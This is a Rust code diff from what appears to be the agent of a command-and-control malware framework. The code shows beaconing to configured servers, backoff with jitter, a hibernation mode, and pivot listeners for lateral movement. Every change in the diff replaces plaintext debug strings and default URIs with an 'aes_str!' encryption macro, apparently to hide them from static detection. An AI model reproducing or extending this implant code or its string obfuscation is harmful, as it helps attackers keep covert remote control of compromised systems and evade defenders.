@@ -232,7 +232,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
     let verify_key = VerifyingKey::from_bytes(&pub_bytes)?;
 
     if config.debug {
-        println!("[*] Client Started. ID: {}", hwid);
+        println!("{}: {}", aes_str!("[*] Client Started. ID"), hwid);
     }
 
     // ── Hibernation mode dispatch ──────────────────────────────────────
@@ -273,7 +273,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
         ep_config.proxy = resolved.proxy.clone();
 
         if config.debug {
-            eprintln!("[*] Trying endpoint: {}:{} ({:?})", resolved.host, resolved.port, resolved.transport);
+            eprintln!("{}: {}:{} ({:?})", aes_str!("[*] Trying endpoint"), resolved.host, resolved.port, resolved.transport);
         }
 
         let transport = ClientTransport::new(&ep_config);
@@ -282,7 +282,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
         if let Err(ref e) = stream_result {
             fb_mgr.record_failure(ep_index);
             if config.debug {
-                eprintln!("[-] Connection Failed ({}:{}): {}", resolved.host, resolved.port, e);
+                eprintln!("{} ({}:{}): {}", aes_str!("[-] Connection Failed"), resolved.host, resolved.port, e);
             }
             let base_delay = std::cmp::min(5u64 * 2u64.saturating_pow(connect_failures), 300);
             let jitter = rand::thread_rng().gen_range(0..=base_delay / 2);
@@ -351,7 +351,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
                 let first_msg = match DataMolder::recv(&mut reader, &handshake_profile).await {
                     Ok(b) => b,
                     Err(_) => {
-                        if config.debug { eprintln!("[-] Failed to receive from server"); }
+                        if config.debug { eprintln!("{}", aes_str!("[-] Failed to receive from server")); }
                         continue;
                     }
                 };
@@ -369,7 +369,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
                     };
                     let sig = ed25519_dalek::Signature::from_bytes(&sig_arr);
                     if verify_key.verify(challenge.nonce.as_bytes(), &sig).is_err() {
-                        if config.debug { eprintln!("[-] Server proof failed — aborting"); }
+                        if config.debug { eprintln!("{}", aes_str!("[-] Server proof failed — aborting")); }
                         continue;
                     }
 
@@ -443,7 +443,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
                 tokio::spawn(async move {
                     let result = cascade_mgr.lock().await.start_agent_listener(port).await;
                     if debug {
-                        eprintln!("[Pivot] Auto-cascade: {}", result);
+                        eprintln!("{}: {}", aes_str!("[Pivot] Auto-cascade"), result);
                     }
                 });
             }
@@ -562,13 +562,13 @@ async fn run_http_mode(
         ep_config.tunnel_port = resolved.port;
         ep_config.proxy = resolved.proxy.clone();
 
-        if config.debug { eprintln!("[*] HTTP: trying {}:{}", resolved.host, resolved.port); }
+        if config.debug { eprintln!("{}: {}:{}", aes_str!("[*] HTTP: trying"), resolved.host, resolved.port); }
 
         let c = match http_transport::build_client(&ep_config) {
             Ok(c) => c,
             Err(e) => {
                 fb_mgr.record_failure(ep_idx);
-                if config.debug { eprintln!("[-] Client build failed: {}", e); }
+                if config.debug { eprintln!("{}: {}", aes_str!("[-] Client build failed"), e); }
                 tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                 continue;
             }
@@ -582,13 +582,13 @@ async fn run_http_mode(
             }
             Err(e) => {
                 fb_mgr.record_failure(ep_idx);
-                if config.debug { eprintln!("[-] HTTP register failed ({}:{}): {}", resolved.host, resolved.port, e); }
+                if config.debug { eprintln!("{} ({}:{}): {}", aes_str!("[-] HTTP register failed"), resolved.host, resolved.port, e); }
                 tokio::time::sleep(std::time::Duration::from_secs(10)).await;
             }
         }
     };
 
-    if config.debug { println!("[+] HTTP registered at {}", base); }
+    if config.debug { println!("{} {}", aes_str!("[+] HTTP registered at"), base); }
 
     // Channel for outbound results (handlers send via tx, we POST them)
     let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(100);
@@ -608,15 +608,15 @@ async fn run_http_mode(
         tokio::spawn(async move {
             let result = cascade_mgr.lock().await.start_agent_listener(port).await;
             if debug {
-                eprintln!("[HTTP Pivot] Auto-cascade: {}", result);
+                eprintln!("{}: {}", aes_str!("[HTTP Pivot] Auto-cascade"), result);
             }
         });
     }
 
     let poll_uri = config.profile.http_get.uris.first()
-        .cloned().unwrap_or_else(|| "/api/v1/sync".to_string());
+        .cloned().unwrap_or_else(|| aes_str!("/api/v1/sync"));
     let post_uri = config.profile.http_post.uris.first()
-        .cloned().unwrap_or_else(|| "/api/v1/sync".to_string());
+        .cloned().unwrap_or_else(|| aes_str!("/api/v1/sync"));
 
     let mut base_sleep = config.sleep_interval;
     let mut base_jitter_min = config.jitter_min;
@@ -661,7 +661,7 @@ async fn run_http_mode(
                 }
             }
             Err(e) => {
-                if config.debug { eprintln!("[-] Poll error: {}", e); }
+                if config.debug { eprintln!("{}: {}", aes_str!("[-] Poll error"), e); }
             }
         }
 
